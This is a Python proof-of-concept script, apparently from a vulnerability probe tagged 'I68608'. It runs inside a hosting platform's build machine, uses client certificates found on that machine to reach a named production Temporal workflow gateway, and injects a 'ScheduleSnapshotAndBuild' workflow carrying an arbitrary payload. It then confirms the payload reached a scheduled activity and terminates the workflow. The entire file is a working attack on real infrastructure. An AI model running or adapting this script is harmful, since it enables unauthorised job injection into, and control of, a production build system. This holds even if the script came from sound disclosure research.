#!/usr/bin/env python3
# I68608 delivery probe (runs INSIDE a metal builder that has 443 egress).
# Payload metadata: encoding=json/protobuf + messageType=orchestrator.StartSnapshotAndBuildRequest
# (matches the platform's own successful executions). Duration fields are protojson strings.
import subprocess, struct, json, sys, os, time, re, base64

G='https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA='/pki/server-ca-bundle.crt'; CRT='/pki/client.crt'; KEY='/pki/client.key'
T='/temporal.api.workflowservice.v1.WorkflowService/'
NS='builds'; QUEUE='orchestrator'
ET={1:'WfStarted',2:'WfCompleted',3:'WfFailed',4:'WfTimedOut',5:'WfTaskScheduled',6:'WfTaskStarted',
    7:'WfTaskCompleted',8:'WfTaskTimedOut',9:'WfTaskFailed',10:'ActScheduled',11:'ActStarted',
    12:'ActCompleted',13:'ActFailed',14:'ActTimedOut',15:'TimerStarted',16:'TimerFired',
    24:'WfTerminated',25:'WfCancelRequested',26:'ChildInitiated',27:'ChildInitFailed',28:'ChildStarted',
    29:'ChildCompleted',30:'ChildFailed',32:'ChildTimedOut'}
MARK='I68608-tmenc2'
PAYLOAD_JSON=open('/payload.json','rb').read()

def varint(n):
    o=bytearray()
    while True:
        b=n&0x7f; n>>=7
        if n: o.append(b|0x80)
        else: o.append(b); return bytes(o)
def fv(f,n): return varint(f<<3)+varint(n)
def fb(f,b): return varint((f<<3)|2)+varint(len(b))+b
def fs(f,s): return fb(f,s.encode() if isinstance(s,str) else s)
def fmsg(f,m): return fb(f,m)
def rd_varint(b,i):
    r=0;s=0
    while i<len(b):
        x=b[i];r|=(x&0x7f)<<s;i+=1
        if not x&0x80: return r,i
        s+=7
    raise ValueError('v')
def parse(b):
    i=0;out=[]
    while i<len(b):
        k,i=rd_varint(b,i);f=k>>3;w=k&7
        if w==0: v,i=rd_varint(b,i);out.append((f,0,v))
        elif w==2:
            l,i=rd_varint(b,i)
            if i+l>len(b): raise ValueError('len')
            out.append((f,2,b[i:i+l]));i+=l
        elif w==5: out.append((f,5,b[i:i+4]));i+=4
        elif w==1: out.append((f,1,b[i:i+8]));i+=8
        else: raise ValueError('wt')
    return out
CTR=[0]
def call(path,body=b'',timeout=25):
    CTR[0]+=1
    fu='/tmp/w%d.bin'%CTR[0];hu='/tmp/wh%d.txt'%CTR[0];bu='/tmp/wb%d.bin'%CTR[0]
    with open(fu,'wb') as fh:
        fh.write(b'\x00'+struct.pack('>I',len(body))+body); fh.flush(); os.fsync(fh.fileno())
    subprocess.run(['curl','-sS','--http2','--connect-timeout','6','-m',str(timeout),'-D',hu,'-o',bu,
                    '--cert',CRT,'--key',KEY,'--cacert',CA,'-X','POST',G+path,
                    '-H','te: trailers','-H','content-type: application/grpc','--data-binary','@'+fu],
                   capture_output=True,text=True)
    hdr=open(hu,'rb').read().decode('utf-8','replace') if os.path.exists(hu) else ''
    sts=re.findall(r'grpc-status:\s*(\d+)',hdr); msgs=re.findall(r'grpc-message:\s*([^\r\n]*)',hdr)
    data=open(bu,'rb').read() if os.path.exists(bu) else b''
    for f in (fu,hu,bu):
        try: os.unlink(f)
        except Exception: pass
    return {'st':sts[-1] if sts else '-','msg':msgs[-1].strip()[:200] if msgs else '','data':data,'n':len(data)}
def payloadbytes(b):
    if len(b)>=5 and b[0]==0: return b[5:5+struct.unpack('>I',b[1:5])[0]]
    return b
def g1(b,f):
    try:
        for ff,w,v in parse(b):
            if ff==f and w==2: return v
    except Exception: return None
def g1v(b,f):
    try:
        for ff,w,v in parse(b):
            if ff==f and w==0: return v
    except Exception: return None
def evid(wid,rid=''): return fs(1,wid)+(fs(2,rid) if rid else b'')
def dur(s): return fv(1,s)

def build_payload(js):
    meta=fmsg(1,fs(1,'encoding')+fs(2,'json/protobuf'))+\
         fmsg(1,fs(1,'messageType')+fs(2,'orchestrator.StartSnapshotAndBuildRequest'))
    return meta+fmsg(2,js)

def start(wid,inp,et=180,rt=300,wt=30):
    b=fs(1,NS)+fs(2,wid)+fmsg(3,fs(1,'ScheduleSnapshotAndBuild'))+fmsg(4,fs(1,QUEUE))
    b+=fmsg(5,fmsg(1,build_payload(inp)))
    b+=fmsg(6,dur(et))+fmsg(7,dur(rt))+fmsg(8,dur(wt))
    b+=fs(9,'i68608-probe')+fs(10,'i68608-'+wid[-12:])+fv(11,2)
    return b
def hist(wid,rid='',size=40):
    return call(T+'GetWorkflowExecutionHistory',fs(1,NS)+fmsg(2,evid(wid,rid))+fv(3,size),timeout=30)
def events(r):
    pl=payloadbytes(r['data']); h=g1(pl,1) or b''
    return [v for f,w,v in parse(h) if f==1 and w==2]
def etype(ev): return g1v(ev,3) or 0
def wfid_of(ev):
    a=g1(ev,6) or b''
    return g1(a,1)
def runid_of(ev):
    a=g1(ev,6) or b''
    return g1(a,2)

def main():
    js=PAYLOAD_JSON.decode()
    print('===I68608 START===',time.strftime('%Y%m%dT%H%M%SZ',time.gmtime()))
    print('PAYLOAD_KEYS_LEN=%d'%len(js))
    r=call(T+'GetSystemInfo',b'',timeout=15)
    print('CTL|GetSystemInfo|st=%s|%s'%(r['st'],r['msg'][:60]))
    if r['st']!='0':
        print('NOEGRESS'); print('===I68608 END==='); return
    wid='i68608-tmenc2-%d'%int(time.time())
    rr=call(T+'StartWorkflowExecution',start(wid,js),timeout=30)
    print('START|st=%s|m=%s|len=%d'%(rr['st'],rr['msg'][:120],rr['n']))
    if rr['st']!='0':
        print('===I68608 END==='); return
    rid=''
    hits=0
    t0=time.time()
    while time.time()-t0<300:
        time.sleep(6)
        h=hist(wid)
        if h['st']!='0':
            print('HIST_ERR|st=%s|%s'%(h['st'],h['msg'][:80])); continue
        evs=events(h)
        types=[etype(e) for e in evs]
        names=[ET.get(t,str(t)) for t in types]
        print('EV|t=%.1f|%s'%(time.time()-t0,','.join(names)))
        # first event carries execution identity
        if not rid and evs:
            try:
                rid=(runid_of(evs[0]) or b'').decode()
            except Exception: pass
        if 10 in types and hits<3:
            for e in evs:
                if etype(e)==10:
                    a=g1(e,10) or b''
                    tq=g1(a,5)
                    inp=g1(a,6) or b''
                    pls=[v for f,w,v in parse(inp) if f==1 and w==2] if inp else []
                    txt=''
                    if pls:
                        p0=pls[0]; body=b''
                        for f,w,v in parse(p0):
                            if f==2 and w==2: body=v
                        txt=body[:400].decode('utf-8','replace')
                    print('ACTSCHED|tq=%s|arglen=%d|arg=%s'%(txt and tq.decode('utf-8','replace'),len(inp),txt))
            hits+=1
            # immediate termination
            term=call(T+'TerminateWorkflowExecution',fs(1,NS)+fmsg(2,evid(wid,rid))+
                      fs(3,'i68608 evidence collected')+fv(4,0),timeout=20)
            print('TERM|st=%s|m=%s'%(term['st'],term['msg'][:80]))
            print('RESULT=ACT_SCHEDULED_PAYLOAD_CONTROLLED')
            break
        if any(t in (2,3,4,24) for t in types):
            # terminal: print failure message if any
            for e in evs:
                if etype(e)==3:
                    a=g1(e,3) or b''
                    msg=b''
                    try:
                        for f,w,v in parse(a):
                            if f==1 and w==2: msg=v
                    except Exception: pass
                    print('FAILURE|%s'%msg[:500].decode('utf-8','replace'))
            print('RESULT=%s'%','.join(names))
            break
    print('===I68608 END===')

main()
